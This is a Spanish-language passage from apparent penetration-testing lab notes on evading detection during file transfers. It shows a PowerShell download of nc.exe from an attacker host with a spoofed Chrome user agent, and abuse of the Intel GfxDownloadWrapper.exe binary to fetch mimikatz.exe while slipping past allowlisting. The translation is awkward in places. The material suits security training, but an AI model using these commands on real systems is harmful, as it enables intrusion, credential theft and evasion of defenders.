# Detección evadente

# **Cambio de agente de usuario**

Si los administradores o defensores diligentes han incluido a cualquiera de estos agentes de usuarios,[Invocar webrequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1)Contiene un parámetro UserAgent, que permite cambiar el agente de usuario predeterminado a un emulador de Internet Explorer, Firefox, Chrome, Opera o Safari. Por ejemplo, si Chrome se usa internamente, configurar este agente de usuario puede hacer que la solicitud parezca legítima.

### **Enumerar los agentes de los usuarios**

Detección evadente

```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | flName       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16

```

Invocar Invoke-WebRequest para descargar NC.EXE usando un agente de usuario de Chrome:

### **Solicitar con el agente de usuario de Chrome**

Detección evadente

```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::ChromePS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Detección evadente

```
xnoxos@htb[/htb]$ nc -lvnp 80listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive

```

---

# **Lolbas / gtfobins**

La lista blanca de la aplicación puede evitar que use PowerShell o NetCat, y el registro de línea de comandos puede alertar a los defensores a su presencia. En este caso, una opción puede ser usar un "lolbin" (viviendo fuera del binario de la tierra), alternativamente también conocido como "binarios de confianza fuera de lugar". Un ejemplo de LOLBin es el controlador Intel Graphics para Windows 10 (GFXDownloadWrapper.exe), instalado en algunos sistemas y contiene funcionalidad para descargar archivos de configuración periódicamente. Esta funcionalidad de descarga se puede invocar de la siguiente manera:

### **Transferencia de archivo con gfxdownloadwrapper.exe**

Detección evadente

```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

```

Tal binario podría permitirse ejecutarse mediante la aplicación blanca y excluida de la alerta. Otros binarios más comúnmente disponibles también están disponibles, y vale la pena verificarlo[Lolbas](https://lolbas-project.github.io/)Proyecto para encontrar un binario adecuado "Descarga de archivos" que exista en su entorno. El equivalente de Linux es el[Gtfobinas](https://gtfobins.github.io/)Proyecto y definitivamente también vale la pena echarle un vistazo. Al momento de escribir, el proyecto GTFobins proporciona información útil sobre casi 40 binarios comúnmente instalados que pueden usarse para realizar transferencias de archivos.

---

# **Pensamientos de cierre**

Como hemos visto en este módulo, hay muchas formas de transferir archivos hacia y desde nuestro host de ataque entre los sistemas Windows y Linux. Vale la pena practicar tantos de estos como sea posible a lo largo de los módulos en la ruta del probador de penetración. ¿Tienes un shell web en un objetivo? Intente descargar un archivo al objetivo para una enumeración adicional usando CertUtil. ¿Necesita descargar un archivo del objetivo? Pruebe un servidor SMB de Impacket o un servidor web de Python con capacidades de carga. Consulte este módulo periódicamente y esfuércese por usar todos los métodos enseñados de alguna manera. Además, tómese un tiempo cuando trabaje en un objetivo o laboratorio para buscar un lolbin o gtfobin con el que nunca haya trabajado antes para lograr sus objetivos de transferencia de archivos.